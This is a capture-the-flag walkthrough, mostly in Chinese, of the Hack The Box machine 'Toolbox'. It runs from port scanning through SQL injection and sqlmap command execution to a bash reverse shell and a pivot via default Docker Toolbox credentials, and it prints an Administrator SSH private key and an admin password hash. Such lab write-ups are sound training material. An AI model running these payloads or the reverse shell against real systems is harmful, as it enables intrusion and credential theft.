## Toolbox
```
[★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.96.171 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
┌─[us-dedivip-2]─[10.10.14.93]─[syareya55@htb-jhoyqs8t8m]─[~]
└──╼ [★]$ nmap -p$ports -sC -sV 10.129.96.171
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-04 23:36 CST
Nmap scan report for 10.129.96.171
Host is up (0.0087s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
|_http-title: MegaLogistics
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.38 (Debian)
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-05T05:37:53
|_  start_date: N/A
```
#### Nmap输出显示端口21 （FTP）、22 （SSH）、135 （RPC）、139 （NetBIOS）、443 （Apache）、445已获取SMB和5985 （Windows Remote Management）。
#### 这是一台Windows电脑，但是Apache服务器被检测到运行在Debian服务器上。这表明某种虚拟化/容器化在这里发挥了作用。
#### Nmap输出还显示FTP服务器配置为匿名访问。首先，添加防火墙规则允许目标机器连接到我们（如果被动模式传输是启用)。
```
[★]$ ftp 10.129.96.171
Connected to 10.129.96.171.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.129.96.171:root): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58783|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
ftp> exit
221 Goodbye
```
#### 匿名登录成功，可以看到名为“docker-toolbox.exe”的文件。有可能服务器正在运行Docker工具箱来承载容器。
#### 浏览到端口443 （https//:）时，我们遇到了SSL证书问题。接受警告并进入网站。
#### 在Nmap上也显示了一个megalologistics公司的网站被托管输出。检查SSL证书，发现证书对FQDN有效admin.megalogistic.com
#### FQDN = Fully Qualified Domain Name（完全限定域名）
#### commonName（简称 CN）是 SSL/TLS 证书里的一个字段 commonName=admin.megalogistic.com
```
[★]$ echo '10.129.96.171 admin.megalogistic.com' | sudo tee -a /etc/hosts
```
![图片](images/2026020501.png)
#### 一个不同的网站具有管理员登录页面是可见的。在尝试了各种简单的SQL之后注入有效载荷，它发现身份验证可以绕过用户名admin' or 1=1 --  | 靠 请填入' or 1=1 --
```
Warning: pg_query(): Query failed: ERROR: syntax error at or near "1" LINE 1: ...sers WHERE username = 'admin'' AND password = md5('1=1 --'); ^ in /var/www/admin/index.php on line 10

Warning: pg_num_rows() expects parameter 1 to be resource, bool given in /var/www/admin/index.php on line 11

|
SELECT * FROM users WHERE username = '{input user}' AND password = md5('{input password}');
|
SELECT * FROM users WHERE username = '' or 1=1-- -'' AND password = md5('anything');
```
#### 我们可以从中学到很多东西：
#### 表单很容易受到SQL注入的攻击。
#### 错误来自pg query()，这表明后端数据库是PostgreSQL。
#### 密码使用MD5哈希存储。
![图片](images/2026020502.png)
#### 我在管理仪表盘，但它没什么用。
### Enumerate DB
#### 登录表单不会将来自DB的数据显示回页面，因此这是一种更困难的盲注入。对于像Toolbox这样简单的盒子，我将使用sqlmap。我将保存从Burp登录的POST请求到一个文件，右键单击“Copy to File”--> toolbox.req。
```
[★]$ burpsuite
```
#### 重要的是，这个请求中不能有任何注入，否则sqlmap会大喊大叫。
```
[*] starting @ 00:41:01 /2026-02-05/

[00:41:01] [INFO] parsing HTTP request from 'toolbox.req'
[00:41:01] [WARNING] it appears that you have provided tainted parameter values ('username=' or 1%3D1 --') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] N
[00:41:01] [WARNING] your sqlmap version is outdated

[*] ending @ 00:41:01 /2026-02-05/
```
#### 这就是它的大喊大叫，让我们不要以注入语句登录，按正常的admin/123456,再抓一次burpsuite
#### 我将运行-r toolbox.req请求为它提供要使用的文件、——force-ssl（因为站点就在那里）和——batch，以便在提示时接受默认值。它发现了四种注射方式：
```
[★]$ sqlmap -r toolbox.req --force-ssl --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:46:04 /2026-02-05/

sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=admin' AND (SELECT (CASE WHEN (7445=7445) THEN NULL ELSE CAST((CHR(70)||CHR(77)||CHR(84)||CHR(117)) AS NUMERIC) END)) IS NULL AND 'STBO'='STBO&password=123456

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin' AND 1914=CAST((CHR(113)||CHR(98)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1914=1914) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(122)||CHR(107)||CHR(113)) AS NUMERIC) AND 'Plnd'='Plnd&password=123456

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin';SELECT PG_SLEEP(5)--&password=123456

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=admin' AND 5151=(SELECT 5151 FROM PG_SLEEP(5)) AND 'TJJe'='TJJe&password=123456
---
[00:46:31] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[00:46:31] [INFO] fetched data logged to text files under '/home/syareya55/.local/share/sqlmap/output/admin.megalogistic.com'
[00:46:31] [WARNING] your sqlmap version is outdated

[*] ending @ 00:46:31 /2026-02-05/
```
```
 [★]$ sqlmap -r toolbox.req --force-ssl --batch -D public --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:49:56 /2026-02-05/

[00:49:56] [INFO] parsing HTTP request from 'toolbox.req'
[00:49:56] [INFO] resuming back-end DBMS 'postgresql' 
[00:49:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=admin' AND (SELECT (CASE WHEN (7445=7445) THEN NULL ELSE CAST((CHR(70)||CHR(77)||CHR(84)||CHR(117)) AS NUMERIC) END)) IS NULL AND 'STBO'='STBO&password=123456

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin' AND 1914=CAST((CHR(113)||CHR(98)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1914=1914) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(122)||CHR(107)||CHR(113)) AS NUMERIC) AND 'Plnd'='Plnd&password=123456

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin';SELECT PG_SLEEP(5)--&password=123456

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=admin' AND 5151=(SELECT 5151 FROM PG_SLEEP(5)) AND 'TJJe'='TJJe&password=123456
---
[00:49:56] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[00:49:56] [INFO] fetching tables for database: 'public'
[00:49:56] [INFO] retrieved: 'users'
Database: public
[1 table]
+-------+
| users |
+-------+

[00:49:56] [INFO] fetched data logged to text files under '/home/syareya55/.local/share/sqlmap/output/admin.megalogistic.com'
[00:49:56] [WARNING] your sqlmap version is outdated

[*] ending @ 00:49:56 /2026-02-05/
```
```
[★]$ sqlmap -r toolbox.req --force-ssl --batch -D public -T users --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.12#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

                               
Database: public
Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+

```
### Commands via SQL
#### 有一种技术很少奏效，但总是值得一试，那就是sqlmap中的——os-cmd标志。从文档中，对于PostgreSQL，它将上传一个共享库到系统，该库将与数据库一起工作，并在系统上运行任意命令。

#### 我将尝试whoami，因为它可以在Linux或Windows上工作，它可以工作：
```
[★]$ sqlmap -r toolbox.req --force-ssl --batch --os-cmd whoami
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.12#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>
---
[00:55:34] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.3.14, Apache 2.4.38
back-end DBMS: PostgreSQL
[00:55:34] [INFO] fingerprinting the back-end DBMS operating system
[00:55:34] [INFO] the back-end DBMS operating system is Linux
[00:55:34] [INFO] testing if current user is DBA
[00:55:34] [INFO] retrieved: '1'
do you want to retrieve the command standard output? [Y/n/a] Y
[00:55:34] [INFO] retrieved: 'postgres'
command standard output: 'postgres'
[00:55:35] [INFO] fetched data logged to text files under '/home/syareya55/.local/share/sqlmap/output/admin.megalogistic.com'
[00:55:35] [WARNING] your sqlmap version is outdated

[*] ending @ 00:55:35 /2026-02-05/
```
#### 前面的命令将操作系统标识为Debian 10。根据HTB，这是一个Windows主机，它必须在Docker容器中。id命令也会返回：
```
[★]$ sqlmap -r toolbox.req --force-ssl --batch --os-cmd id
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>
---
[00:58:09] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.3.14, Apache 2.4.38
back-end DBMS: PostgreSQL
[00:58:09] [INFO] fingerprinting the back-end DBMS operating system
[00:58:09] [INFO] the back-end DBMS operating system is Linux
[00:58:09] [INFO] testing if current user is DBA
[00:58:10] [INFO] retrieved: '1'
do you want to retrieve the command standard output? [Y/n/a] Y
[00:58:10] [INFO] retrieved: 'uid=102(postgres) gid=104(postgres) groups=104(...
command standard output: 'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'
[00:58:10] [INFO] fetched data logged to text files under '/home/syareya55/.local/share/sqlmap/output/admin.megalogistic.com'
[00:58:10] [WARNING] your sqlmap version is outdated

[*] ending @ 00:58:10 /2026-02-05/
```
#### ——os-shell标志也会进入一个交互式提示符，以运行多个命令：
```
[★]$ sudo nc -lvnp 443
listening on [any] 443 ...

[★]$ sqlmap -r toolbox.req --force-ssl --batch --os-shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


---
[01:04:09] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[01:04:09] [INFO] fingerprinting the back-end DBMS operating system
[01:04:10] [INFO] the back-end DBMS operating system is Linux
[01:04:10] [INFO] testing if current user is DBA
[01:04:10] [INFO] retrieved: '1'
[01:04:10] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[01:04:10] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.93/443 0>&1"
do you want to retrieve the command standard output? [Y/n/a] Y

[★]$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.96.171] 50106
bash: cannot set terminal process group (1272): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ whoami
whoami
postgres
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ cd /

//没有安装旧版Python，但Python3是：
postgres@bc56e3cc55e9:/$ python -V
python -V
bash: python: command not found
postgres@bc56e3cc55e9:/$ python3 -V
python3 -V
Python 3.7.3
postgres@bc56e3cc55e9:/$

//我将使用标准技巧升级我的shell：
postgres@bc56e3cc55e9:/$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
postgres@bc56e3cc55e9:/$ ^Z
[1]+  Stopped                 sudo nc -lvnp 443
[★]$ stty raw -echo; fg
sudo nc -lvnp 443
                 reset
bash: [1275: 2 (255)] tcsetattr: Inappropriate ioctl for device
postgres@bc56e3cc55e9:/$

//这一点很重要，因为如果没有完整的TTY，我就无法执行接下来的步骤。

//在postgres的主目录中也有一个user.txt（不确定为什么在文件中说flag.txt，但哈希有效）：
postgres@bc56e3cc55e9:/$ cd ~ 
postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
f0183e443**  flag.txt
postgres@bc56e3cc55e9:/var/lib/postgresql$ 


```
### Shell as docker/root in VM
#### 我现在肯定不在主机上，ifconfig显示IP 172.17.0.2：
```
postgres@bc56e3cc55e9:/var/lib/postgresql$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 4140  bytes 711808 (695.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3118  bytes 3922117 (3.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                         postgres@bc56e3cc55e9:/var/lib/postgresql$ 
```
#### 文件系统是空的。
#### Docker-Toolbox
#### Docker Toolbox使用VirtualBox来运行包含所有容器的VM。这是通过使用VirtualBox上的Boot2Docker发行版。看看文档，默认的发现凭据为docker / tcuser。Docker主机始终存在于网关IP地址。
```
postgres@bc56e3cc55e9:/$ python3 -c "import pty;pty.spawn('/bin/bash')"
postgres@bc56e3cc55e9:/$ ssh docker@172.17.0.1
docker@172.17.0.1's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ 
docker@box:~$ sudo -l                                                          
User docker may run the following commands on this host:
    (root) NOPASSWD: ALL
docker@box:~$ whoami                                                           
docker
```
#### 我们能够登录到Docker VM。根据文档，docker-toolbox有默认情况下访问c:\Users文件夹，该文件夹挂载在/c/Users
```
docker@box:~$ cd  /c/Users                                                     
docker@box:/c/Users$ ls                                                        
Administrator  Default        Public         desktop.ini
All Users      Default User   Tony
```
#### 在Administrator文件夹中，我们找到一个。要存在的SSH文件夹。
```
docker@box:/c/Users$ cd Administrator
docker@box:/c/Users/Administrator$ ls -al                                      
total 1449
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 .
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 ..
drwxrwxrwx    1 docker   staff         4096 Feb  5 05:32 .VirtualBox
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 .docker
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 .ssh
<SNIP>
```
#### 此文件夹包含一个私有SSH密钥，可用于以管理员身份登录主主机
```
docker@box:/c/Users/Administrator$ cd .ssh                                     
docker@box:/c/Users/Administrator/.ssh$ ls                                     
authorized_keys  id_rsa           id_rsa.pub       known_hosts
docker@box:/c/Users/Administrator/.ssh$ cat id_rsa                             
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
MlS1yYg4tGJaWFFZGSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----
docker@box:/c/Users/Administrator/.ssh$                                        

```
#### 这里的公钥是授权密钥，因为这没有返回任何东西：
```
docker@box:/c/Users/Administrator/.ssh$ diff id_rsa.pub authorized_keys
```
#### ssh-keygen -y -e -f keyfile将返回密钥的公钥，因此我可以使用它来检查这里的私钥是否与公钥匹配（以及授权密钥中的公钥）：
```
docker@box:/c/Users/Administrator/.ssh$ ssh-keygen -y -e -f id_rsa             
---- BEGIN SSH2 PUBLIC KEY ----
Comment: "2048-bit RSA, converted by docker@box from OpenSSH"
AAAAB3NzaC1yc2EAAAADAQABAAABAQC+jhIuWD92RK0DiMNQ3GAXyRs0AX7ohgs044J6ml
+PPpFI5C8x3TxpsbKeEozOyKJUJ4miP0vwZ9JcZkh+wAhZef2fI1oN0CmgXsx+bUoi2A75
b2YzuUCuzjOAHMwZCV4iyRC9ZNwqtA10IOP0nE0huFguEleCuj67l1boRxjOrYxI5GbsD5
5d+Y+92viETTA1QjDHag4+vZ24F+bG6EvyZlBa7lTX4il7Y2/h8BRiEoZNYePihyNTAb1d
xTSIjilwdPedc8qYaOg/KI/OlrlZ2InxCkwTf3w2d7iafE5uhZOneMZonUa6dkLKJzSJLB
6ZwEmI3J9kKFOKlaYEwrzz
---- END SSH2 PUBLIC KEY ----
docker@box:/c/Users/Administrator/.ssh$ ssh-keygen -y -e -f id_rsa.pub         
---- BEGIN SSH2 PUBLIC KEY ----
Comment: "2048-bit RSA, converted by docker@box from OpenSSH"
AAAAB3NzaC1yc2EAAAADAQABAAABAQC+jhIuWD92RK0DiMNQ3GAXyRs0AX7ohgs044J6ml
+PPpFI5C8x3TxpsbKeEozOyKJUJ4miP0vwZ9JcZkh+wAhZef2fI1oN0CmgXsx+bUoi2A75
b2YzuUCuzjOAHMwZCV4iyRC9ZNwqtA10IOP0nE0huFguEleCuj67l1boRxjOrYxI5GbsD5
5d+Y+92viETTA1QjDHag4+vZ24F+bG6EvyZlBa7lTX4il7Y2/h8BRiEoZNYePihyNTAb1d
xTSIjilwdPedc8qYaOg/KI/OlrlZ2InxCkwTf3w2d7iafE5uhZOneMZonUa6dkLKJzSJLB
6ZwEmI3J9kKFOKlaYEwrzz
---- END SSH2 PUBLIC KEY ----
```
#### 它们相配 They match
### SSH
```
[★]$ vi id_rsa
[★]$ chmod 600 id_rsa
[★]$ ssh -i id_rsa administrator@10.129.96.171

Microsoft Windows [Version 10.0.17763.1039]
(c) 2018 Microsoft Corporation. All rights reserved. 

administrator@TOOLBOX C:\Users\Administrator>ls      
'ls' is not recognized as an internal or external command, 
operable program or batch file.

administrator@TOOLBOX C:\Users\Administrator>
administrator@TOOLBOX C:\Users\Administrator>whoami
toolbox\administrator

administrator@TOOLBOX C:\Users\Administrator>type Desktop\root.txt
```
